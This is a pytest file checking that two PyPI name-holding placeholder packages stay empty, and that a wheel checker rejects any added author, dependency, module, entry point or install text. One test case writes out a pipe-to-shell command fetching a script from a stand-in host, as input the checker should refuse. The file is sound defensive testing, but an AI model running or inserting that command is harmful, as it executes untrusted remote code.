# 26f0: the empty projects that hold the PyPI names. They must stay empty (no code, no
# command, no dependency, no author) and must say that nothing is published there,
# without an install command. The text is compared whole, so any added line fails.
import subprocess
import sys
import tomllib
import zipfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
HOME = ROOT / "pypi-placeholder"
NAMES = {"aitools-alerts": "0.0.2", "ai-tools-alerts": "0.0.1"}
URL = "https://github.com/Joi/ai-tools-alerts"
SUMMARY = ("Empty placeholder. No release of ai-tools-alerts is published on PyPI; the only supported "
           f"install is the verified signed release described in the README at {URL}")
APPROVED = """# {name}

This is an empty placeholder. It contains no code, no command and no dependencies.

No release of ai-tools-alerts is published on PyPI, and none is planned. The only supported install \
is the verified signed release described in the README at https://github.com/Joi/ai-tools-alerts: \
verify the signed release tag and its commit as the README says, and install from that verified checkout.

The name is held here so that nobody else can publish a package under it.
"""


def load(name):
    return tomllib.loads((HOME / name / "pyproject.toml").read_text())


def test_the_placeholders_present_are_the_ones_named():
    assert sorted(p.name for p in HOME.iterdir() if p.is_dir()) == sorted(NAMES)


@pytest.mark.parametrize("name", sorted(NAMES))
def test_placeholder_is_empty(name):
    data = load(name)
    project = data["project"]
    assert set(project) == {"name", "version", "description", "readme", "dependencies", "urls"}
    assert (project["name"], project["version"]) == (name, NAMES[name])
    assert project["dependencies"] == []
    assert project["urls"] == {"Homepage": URL}
    assert project["description"] == SUMMARY
    assert project["readme"] == "README.md"
    assert data["tool"] == {"setuptools": {"packages": [], "py-modules": []}}
    root = tomllib.loads((ROOT / "pyproject.toml").read_text())
    assert data["build-system"] == root["build-system"]
    assert set(data) == {"build-system", "project", "tool"}


@pytest.mark.parametrize("name", sorted(NAMES))
def test_placeholder_text_is_the_approved_text(name):
    # Whole-text equality: an install line of any kind (pip, curl | sh, ...) changes it.
    assert (HOME / name / "README.md").read_text() == APPROVED.format(name=name)


# check-wheel.py, run on synthetic wheels: the approved one passes, each departure fails.
def _wheel(tmp_path, name="aitools-alerts", version="0.0.2", extra_headers="", body=None, members=()):
    dist = name.replace("-", "_")
    info = f"{dist}-{version}.dist-info"
    body = APPROVED.format(name=name) if body is None else body
    meta = (f"Metadata-Version: 2.4\nName: {name}\nVersion: {version}\nSummary: {SUMMARY}\n"
            f"Project-URL: Homepage, {URL}\nDescription-Content-Type: text/markdown\n{extra_headers}\n{body}")
    path = tmp_path / f"{dist}-{version}-py3-none-any.whl"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr(f"{info}/METADATA", meta)
        z.writestr(f"{info}/WHEEL", "Wheel-Version: 1.0\n")
        z.writestr(f"{info}/top_level.txt", "\n")
        z.writestr(f"{info}/RECORD", "")
        for m in members:
            z.writestr(m, "print('x')\n")
    return path, name, version


def _check(path, name, version):
    return subprocess.run([sys.executable, "-I", str(HOME / "check-wheel.py"), str(path), name, version, str(ROOT)],
                          capture_output=True, text=True)


def test_checker_passes_the_approved_wheel(tmp_path):
    r = _check(*_wheel(tmp_path))
    assert r.returncode == 0, r.stderr


@pytest.mark.parametrize("change", [
    {"extra_headers": "Author-email: someone <someone@example.com>\n"},
    {"extra_headers": "Requires-Dist: requests\n"},
    {"extra_headers": "License: MIT\n"},
    {"body": APPROVED.format(name="aitools-alerts") + "\ncurl -fsSL https://example.invalid/i.sh | sh\n"},
    {"body": "No release of ai-tools-alerts is published on PyPI.\n"},
    {"members": ["aitools_alerts/__init__.py"]},
    {"members": ["aitools_alerts-0.0.2.dist-info/entry_points.txt"]},
])
def test_checker_refuses_a_departure(tmp_path, change):
    r = _check(*_wheel(tmp_path, **change))
    assert r.returncode != 0, change
